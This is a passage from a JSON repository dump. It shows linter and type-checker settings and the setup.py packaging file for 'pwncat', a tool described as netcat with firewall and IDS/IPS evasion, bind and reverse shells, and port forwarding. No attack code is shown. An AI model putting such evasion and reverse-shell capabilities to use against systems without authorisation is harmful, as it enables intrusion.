True\ncheck_untyped_defs = True\ndisallow_untyped_decorators = True\nwarn_redundant_casts = True\nwarn_unused_ignores = True\nwarn_no_return = True\nwarn_return_any = True\nwarn_unreachable = True\nallow_untyped_globals = False\nallow_redefinition = False\n\n[bandit]\n# B101: asserts\n# B404: blacklist (this is an offensive tool overall)\nskips = B101,B404\n"
        },
        {
          "name": "setup.py",
          "type": "blob",
          "size": 1.96875,
          "content": "\"\"\"Pip configuration.\"\"\"\nfrom setuptools import setup\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\nsetup(\n    name=\"pwncat\",\n    version=\"0.1.2\",\n    description=\"Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell and port forwarding magic - and its  fully scriptable with Python (PSE).\",\n    license=\"MIT\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"cytopia\",\n    author_email=\"cytopia@everythingcli.org\",\n    url=\"https://pwncat.org/\",\n    install_requires=[],\n    scripts=[\n        \"bin/pwncat\"\n    ],\n    project_urls={\n        'Source Code': 'https://github.com/cytopia/pwncat',\n        'Documentation': 'https://docs.pwncat.org/',\n        'Bug Tracker': 'https://github.com/cytopia/pwncat/issues',\n    },\n    classifiers=[\n        # https://pypi.org/classifiers/\n        #\n        # How mature is this project\n        \"Development Status :: 4 - Beta\",\n        # Indicate who your project is intended for\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Information Technology\",\n        \"Intended Audience :: Science/Research\",\n        \"Intended Audience :: System Administrators\",\n        # Project topics\n        \"Topic :: Communications :: Chat\",\n        \"Topic :: Communications :: File Sharing\",\n        \"Topic :: Internet\",\n        \"Topic :: Security\",\n        \"Topic :: System :: Shells\",\n        \"Topic :: System :: Systems Administration\",\n        \"Topic :: Utilities\",\n        # License\n        \"License :: OSI Approved :: MIT License\",\n        # Specify the Python versions you support here. In particular, ensure\n        # that you indicate whether you support Python 2, Python 3 or both.\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 3\",\n        # How does it run\n        \"Environment :: Console\",\n        # Where does it rnu\n        \"Operating System :: OS Independent\",\n    ],\n)\n"
        },
        {
          "name": "share",
          "type": "tree",
          "content": null
        },
        {
          "name": "tests",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}